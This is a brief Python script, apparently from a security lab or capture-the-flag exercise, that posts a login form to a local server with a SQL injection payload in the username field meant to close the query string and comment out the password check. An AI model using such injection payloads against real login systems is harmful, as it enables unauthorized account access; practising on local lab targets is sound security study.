import requests
# setting globals and vars
sess = requests.Session()
cookies = []

url = 'http://127.0.0.1:9001'


payload = {'username': 'burdell\';#', 'password':'asdf'}
r = sess.post(url, data=payload)
print(r.text)


